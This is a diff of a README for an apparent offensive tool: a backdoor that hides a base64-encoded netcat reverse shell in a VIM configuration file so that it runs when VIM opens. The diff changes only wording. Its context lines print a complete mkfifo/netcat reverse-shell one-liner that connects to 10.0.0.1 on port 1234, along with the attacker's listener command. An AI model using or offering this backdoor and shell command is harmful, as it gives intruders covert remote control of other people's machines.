@@ -2,7 +2,7 @@
 
 ## Description
 
-A simple backdoor that execute a base64 encoded netcat reverse shell embedd into a VIM Config file. Run VIM execute the reverse shell.
+A simple backdoor that execute a base64 encoded netcat reverse shell embedded into a VIM Config file. Run VIM execute the reverse shell.
 
 ## Requirement
 
@@ -12,7 +12,7 @@ A simple backdoor that execute a base64 encoded netcat reverse shell embedd into
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
-5. Start a netcat listener in your attacker box.
+5. Start a netcat listener in your attack box.
 ```bash
 nc -nvlp 1234
 ```
